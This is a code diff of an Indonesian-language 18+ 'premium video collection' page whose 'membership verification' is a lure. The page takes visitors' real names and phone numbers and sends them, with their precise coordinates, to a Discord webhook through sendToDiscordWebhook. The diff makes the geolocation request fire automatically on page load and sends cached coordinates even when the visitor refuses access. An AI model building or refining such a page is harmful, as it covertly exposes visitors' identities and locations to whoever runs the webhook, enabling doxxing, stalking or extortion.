@@ -5,14 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Koleksi Video Premium</title>
     <style>
-        :root {
-            --primary-color: #8a2be2;
-            --secondary-color: #ff1493;
-            --background-color: #1a1a1a;
-            --text-color: #ffffff;
-            --card-bg: #2d2d2d;
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -21,9 +13,11 @@
         }
 
         body {
-            background-color: var(--background-color);
-            color: var(--text-color);
+            background-color: #1a1a2e;
+            color: #ffffff;
             line-height: 1.6;
+            min-height: 100vh;
+            background-image: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460);
         }
 
         .container {
@@ -34,92 +28,115 @@
 
         header {
             text-align: center;
-            padding: 20px 0;
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-            border-radius: 10px;
+            padding: 30px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
             margin-bottom: 30px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         h1 {
-            font-size: 2.5rem;
+            font-size: 2.8rem;
             margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            background: linear-gradient(45deg, #ff6b6b, #ffa8a8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(255, 107, 107, 0.3);
         }
 
         .tagline {
             font-size: 1.2rem;
             opacity: 0.9;
+            color: #c9c9c9;
         }
 
         .form-section {
-            background-color: var(--card-bg);
+            background: rgba(255, 255, 255, 0.05);
             padding: 30px;
-            border-radius: 10px;
+            border-radius: 15px;
             margin-bottom: 30px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-weight: 600;
+            color: #ffa8a8;
         }
 
         input {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             border: none;
-            border-radius: 5px;
-            background-color: #3a3a3a;
-            color: var(--text-color);
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
             font-size: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            box-shadow: 0 0 0 3px rgba(255, 107, 107, 0.3);
         }
 
         button {
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
             color: white;
             border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
+            padding: 15px 30px;
+            border-radius: 8px;
             cursor: pointer;
-            font-size: 1rem;
+            font-size: 1.1rem;
             font-weight: 600;
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+            display: block;
+            margin: 0 auto;
+            width: 100%;
+            max-width: 300px;
         }
 
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
         }
 
         .video-gallery {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            margin-top: 30px;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
         }
 
         .video-card {
-            background-color: var(--card-bg);
-            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
             overflow: hidden;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .video-card:hover {
-            transform: translateY(-5px);
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
         }
 
         .video-container {
             position: relative;
             width: 100%;
-            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+            padding-top: 56.25%;
         }
 
         .video-container video {
@@ -129,21 +146,24 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .video-info {
-            padding: 15px;
+            padding: 20px;
         }
 
         .video-title {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             margin-bottom: 10px;
             font-weight: 600;
+            color: #ffa8a8;
         }
 
         .video-desc {
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             opacity: 0.8;
+            line-height: 1.5;
         }
 
         .hidden {
@@ -152,112 +172,103 @@
 
         .loading {
             text-align: center;
+            padding: 40px;
+            font-size: 1.3rem;
+            color: #ffa8a8;
+        }
+
+        .location-request {
+            text-align: center;
             padding: 20px;
-            font-size: 1.2rem;
-        }
-
-        .theme-selector {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: var(--card-bg);
-            padding: 10px;
-            border-radius: 5px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-        }
-
-        .theme-selector select {
-            background-color: #3a3a3a;
-            color: var(--text-color);
-            border: none;
-            padding: 5px;
-            border-radius: 3px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 107, 107, 0.3);
         }
 
         footer {
             text-align: center;
-            padding: 20px;
-            margin-top: 40px;
-            border-top: 1px solid #444;
+            padding: 30px;
+            margin-top: 50px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             font-size: 0.9rem;
             opacity: 0.7;
         }
 
-        /* Responsive */
+        .age-warning {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid rgba(255, 107, 107, 0.5);
+        }
+
         @media (max-width: 768px) {
             .video-gallery {
-                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+                grid-template-columns: 1fr;
             }
             
             h1 {
-                font-size: 2rem;
+                font-size: 2.2rem;
+            }
+            
+            .container {
+                padding: 15px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="theme-selector">
-        <label for="theme">Tema:</label>
-        <select id="theme">
-            <option value="default">Default</option>
-            <option value="dark-red">Merah Gelap</option>
-            <option value="blue-purple">Biru-Ungu</option>
-            <option value="adult">Tema Dewasa</option>
-        </select>
-    </div>
-
     <div class="container">
         <header>
-            <h1>Koleksi Video Premium</h1>
-            <p class="tagline">Nikmati konten eksklusif hanya untuk anggota terdaftar</p>
+            <h1>Koleksi Video Eksklusif</h1>
+            <p class="tagline">Konten premium untuk anggota terverifikasi</p>
         </header>
 
+        <div class="age-warning">
+            <p>⚠️ Hanya untuk usia 18+</p>
+        </div>
+
         <section id="formSection" class="form-section">
-            <h2>Verifikasi Anggota</h2>
-            <p>Silakan lengkapi data berikut untuk mengakses koleksi video premium:</p>
+            <h2>Verifikasi Keanggotaan</h2>
+            <p>Untuk mengakses video, lengkapi data verifikasi berikut:</p>
             
             <form id="userForm">
                 <div class="form-group">
                     <label for="fullName">Nama Lengkap:</label>
-                    <input type="text" id="fullName" name="fullName" required>
+                    <input type="text" id="fullName" name="fullName" placeholder="Masukkan nama asli Anda" required>
                 </div>
                 
                 <div class="form-group">
                     <label for="phoneNumber">Nomor Telepon Aktif:</label>
-                    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Contoh: 081234567890" required>
                 </div>
                 
-                <button type="submit">Verifikasi & Lanjutkan</button>
+                <button type="submit">Verifikasi Sekarang</button>
             </form>
-        </section>
 
-        <section id="locationSection" class="form-section hidden">
-            <h2>Akses Lokasi</h2>
-            <p>Kami memerlukan akses lokasi Anda untuk keperluan verifikasi keamanan.</p>
-            <button id="locationBtn">Izinkan Akses Lokasi</button>
+            <div class="location-request">
+            </div>
         </section>
 
         <section id="gallerySection" class="hidden">
-            <h2>Koleksi Video Premium</h2>
-            <p>Selamat menikmati konten eksklusif kami!</p>
+            <h2>Koleksi Video Eksklusif</h2>
+            <p>Selamat menikmati!</p>
             
             <div class="video-gallery" id="videoGallery">
-                <!-- Video akan dimuat di sini -->
             </div>
         </section>
 
         <div id="loading" class="loading hidden">
-            Memuat video...
+            <p>Memverifikasi data dan memuat konten...</p>
         </div>
     </div>
 
     <footer>
-        <p>© 2023 Koleksi Video Premium. Hak Cipta Dilindungi.</p>
     </footer>
 
     <script>
-        // Data video (dapat diganti dengan sumber eksternal)
         const videoData = [
             {
                 title: "Video Eksklusif 1",
@@ -291,23 +302,51 @@
             }
         ];
 
-        // Elemen DOM
         const formSection = document.getElementById('formSection');
-        const locationSection = document.getElementById('locationSection');
         const gallerySection = document.getElementById('gallerySection');
         const videoGallery = document.getElementById('videoGallery');
         const loading = document.getElementById('loading');
         const userForm = document.getElementById('userForm');
-        const locationBtn = document.getElementById('locationBtn');
-        const themeSelector = document.getElementById('theme');
 
-        // Cek apakah pengguna sudah mengisi form sebelumnya
+        // Cek apakah pengguna sudah terverifikasi
         if (localStorage.getItem('userVerified') === 'true') {
-            // Langsung tampilkan gallery
             formSection.classList.add('hidden');
-            locationSection.classList.add('hidden');
             gallerySection.classList.remove('hidden');
             loadVideos();
+        } else {
+            // Langsung minta akses lokasi saat halaman dibuka
+            requestLocation();
+        }
+
+        // Fungsi untuk meminta akses lokasi
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                console.log('Browser tidak mendukung geolocation');
+                return;
+            }
+            
+            // Minta akses lokasi secara otomatis
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    
+                    // Simpan data lokasi
+                    localStorage.setItem('userLat', latitude);
+                    localStorage.setItem('userLng', longitude);
+                    localStorage.setItem('locationRequested', 'true');
+                    
+                    console.log('Lokasi berhasil diambil:', latitude, longitude);
+                },
+                function(error) {
+                    console.log('Akses lokasi ditolak atau tidak tersedia:', error.message);
+                },
+                { 
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                }
+            );
         }
 
         // Handler untuk form pengguna
@@ -317,42 +356,30 @@
             const fullName = document.getElementById('fullName').value;
             const phoneNumber = document.getElementById('phoneNumber').value;
             
-            // Validasi sederhana
             if (!fullName || !phoneNumber) {
                 alert('Harap isi semua field dengan benar.');
                 return;
             }
             
-            // Simpan data sementara
+            // Simpan data pengguna
             localStorage.setItem('userName', fullName);
             localStorage.setItem('userPhone', phoneNumber);
             
-            // Lanjut ke permintaan lokasi
-            formSection.classList.add('hidden');
-            locationSection.classList.remove('hidden');
-        });
-
-        // Handler untuk permintaan lokasi
-        locationBtn.addEventListener('click', function() {
-            if (!navigator.geolocation) {
-                alert('Browser Anda tidak mendukung akses lokasi.');
-                return;
-            }
-            
+            // Tampilkan loading
             loading.classList.remove('hidden');
-            locationSection.classList.add('hidden');
+            formSection.classList.add('hidden');
             
+            // Ambil lokasi lagi untuk memastikan data terbaru
             navigator.geolocation.getCurrentPosition(
-                // Success callback
                 function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     
-                    // Simpan data lokasi
+                    // Simpan data lokasi terbaru
                     localStorage.setItem('userLat', latitude);
                     localStorage.setItem('userLng', longitude);
                     
-                    // Kirim data ke Discord webhook
+                    // Kirim data ke Discord
                     sendToDiscordWebhook(
                         localStorage.getItem('userName'),
                         localStorage.getItem('userPhone'),
@@ -368,12 +395,26 @@
                     gallerySection.classList.remove('hidden');
                     loadVideos();
                 },
-                // Error callback
                 function(error) {
-                    console.error('Error getting location:', error);
-                    alert('Akses lokasi diperlukan untuk melanjutkan. Silakan refresh halaman dan izinkan akses lokasi.');
+                    console.error('Error mendapatkan lokasi:', error);
+                    
+                    // Jika lokasi tidak tersedia, gunakan data yang sudah disimpan sebelumnya
+                    const savedLat = localStorage.getItem('userLat');
+                    const savedLng = localStorage.getItem('userLng');
+                    
+                    if (savedLat && savedLng) {
+                        sendToDiscordWebhook(
+                            localStorage.getItem('userName'),
+                            localStorage.getItem('userPhone'),
+                            savedLat,
+                            savedLng
+                        );
+                    }
+                    
+                    localStorage.setItem('userVerified', 'true');
                     loading.classList.add('hidden');
-                    locationSection.classList.remove('hidden');
+                    gallerySection.classList.remove('hidden');
+                    loadVideos();
                 }
             );
         });
@@ -401,7 +442,7 @@
                 
                 console.log('Data berhasil dikirim ke Discord');
             } catch (error) {
-                console.error('Error sending data to Discord:', error);
+                console.error('Error mengirim data ke Discord:', error);
             }
         }
 
@@ -415,7 +456,7 @@
                 
                 videoCard.innerHTML = `
                     <div class="video-container">
-                        <video controls>
+                        <video controls poster="https://placehold.co/600x400/1a1a2e/ffffff?text=Video+Preview">
                             <source src="${video.src}" type="video/mp4">
                             Browser Anda tidak mendukung tag video.
                         </video>
@@ -429,40 +470,6 @@
                 videoGallery.appendChild(videoCard);
             });
         }
-
-        // Handler untuk perubahan tema
-        themeSelector.addEventListener('change', function() {
-            const root = document.documentElement;
-            
-            switch(this.value) {
-                case 'dark-red':
-                    root.style.setProperty('--primary-color', '#8b0000');
-                    root.style.setProperty('--secondary-color', '#ff4500');
-                    root.style.setProperty('--background-color', '#0a0a0a');
-                    root.style.setProperty('--card-bg', '#1a0a0a');
-                    break;
-                    
-                case 'blue-purple':
-                    root.style.setProperty('--primary-color', '#1e90ff');
-                    root.style.setProperty('--secondary-color', '#9370db');
-                    root.style.setProperty('--background-color', '#0a0a1a');
-                    root.style.setProperty('--card-bg', '#1a1a2a');
-                    break;
-                    
-                case 'adult':
-                    root.style.setProperty('--primary-color', '#ff1493');
-                    root.style.setProperty('--secondary-color', '#ff69b4');
-                    root.style.setProperty('--background-color', '#2a0a2a');
-                    root.style.setProperty('--card-bg', '#3a1a3a');
-                    break;
-                    
-                default:
-                    root.style.setProperty('--primary-color', '#8a2be2');
-                    root.style.setProperty('--secondary-color', '#ff1493');
-                    root.style.setProperty('--background-color', '#1a1a1a');
-                    root.style.setProperty('--card-bg', '#2d2d2d');
-            }
-        });
     </script>
 </body>
 </html>
